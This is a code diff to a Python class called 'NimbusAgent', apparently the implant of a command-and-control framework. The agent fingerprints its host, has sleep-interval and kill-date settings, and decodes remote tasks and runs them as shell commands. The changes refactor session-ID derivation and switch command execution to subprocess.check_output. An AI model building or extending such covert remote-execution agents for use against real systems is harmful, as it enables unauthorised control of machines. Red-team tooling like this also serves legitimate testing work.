@@ -41,8 +41,8 @@ class NimbusAgent:
         self.username = self.get_username()
         self.internal_ip = self.get_internal_ip()
         self.external_ip = self.get_external_ip()
-        self.sleep_interval = ""
-        self.kill_date = ""
+        self.sleep_interval = args.sleep_interval
+        self.kill_date = args.kill_date
         self.task = ""
         self.task_output = ""
 
@@ -52,10 +52,11 @@ class NimbusAgent:
         based on hostname, curent user,
         and current working directory
         """
-        hostname = self.get_hostname()
-        user = self.get_username()
-        cwd = self.get_agent_dir()
-        seed = hostname + user + cwd
+        hostname = self.hostname
+        user = self.username
+        cwd = self.agent_dir
+        agent_pid = str(self.agent_pid)
+        seed = hostname + user + cwd + agent_pid
         session_id = hashlib.md5(seed.encode('utf-8')).hexdigest()
         return session_id
 
@@ -197,17 +198,6 @@ class NimbusAgent:
         return output
 
 
-def derive_session_id(hostname: str, user: str, cwd: str, agent_pid) -> str:
-    """
-    generate a unique session ID
-    based on hostname, curent user,
-    and current working directory
-    """
-    seed = hostname + user + cwd + str(agent_pid)
-    session_id = hashlib.md5(seed.encode('utf-8')).hexdigest()
-    return session_id
-
-
 def decode_task(task):
     logging.debug("base64 decoding agent task")
 
@@ -239,8 +229,8 @@ def exec_cmd(task):
 
     output = ""
 
-    cmd = task["arguments"]
-    cmd = ' '.join(cmd)
+    cmd = task["arguments"][0]
+    cmd = cmd.split(" ")
 
     if cmd == "":
         logging.debug("received an empty task")
@@ -250,7 +240,7 @@ def exec_cmd(task):
     logging.debug(f"executing task: {cmd}")
 
     try:
-        output = subprocess.getoutput(cmd)
+        output = subprocess.check_output(cmd, encoding="iso-8859-1")
     except Exception as e:
         logging.error(e)
         return ""
@@ -303,15 +293,11 @@ def main(args):
         global API_KEY
         API_KEY = args.api_key
 
-    agent.set_sleep_interval(args.sleep_interval)
-    agent.set_kill_date(args.kill_date)
-
     # display agent settings for debugging purposes
     agent_settings = json.dumps(vars(agent), indent=4)
     logging.info("agent settings:")
     print(agent_settings)
-    session_id = derive_session_id(
-        agent.hostname, agent.username, agent.agent_dir, agent.agent_pid)
+    session_id = agent.get_session_id()
     print(f"session ID: {session_id}")
 
     while True:
